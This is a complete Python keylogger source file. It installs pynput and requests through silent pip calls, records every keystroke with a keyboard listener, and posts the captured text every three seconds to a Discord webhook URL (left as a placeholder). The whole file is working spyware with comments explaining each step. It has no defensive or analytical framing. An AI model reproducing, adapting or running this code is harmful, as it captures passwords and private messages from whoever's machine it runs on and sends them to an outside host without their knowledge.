import os #Imports os functions
try:
    os.system("python -m ensurepip --upgrade")  #installs dependencies
except:
    pass
try:
    os.system("python -m pip install pynput requests")  #installs dependencies
except:
    pass
try:
    os.system("py -m pip install pynput requests") #installs dependencies (tries 3 times)
except:
    pass


from pynput import keyboard #imports keyboard functions
import requests #makes internet requests 
import threading #makes threads

text = ""
webhook_url = "https://discord.com/api/webhooks/.....(Real webhook here)" # where to send keylogs to a platform called discord
time_interval = 3

def send_data():
    data = {
        "content": text,
        "title": "Key Logger"
    }
    requests.post(webhook_url, json=data)    #sends keylogs to a platform called discord
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    if key == keyboard.Key.space:   #if person clicks space it sends " ".
        text += " "
    elif key == keyboard.Key.enter:  ##if person clicks enter it sends "\n".
        text += "\n"
    elif key == keyboard.Key.shift: ##if person clicks shifts it skips it.
        pass
    elif key == keyboard.Key.tab:   ##if person clicks tab it sends "\t".
        text += "\t"
    elif key == keyboard.Key.backspace:  ##if person clicks space it removes a piece of text.
        if len(text) > 0:
            text = text[:-1]
        else:
            pass
    elif key == keyboard.Key.esc:     ##if person clicks esc it nothing.
        return False
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:   ##if person clicks ctrl right it sends nothing.
        pass
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_data()
    listener.join()
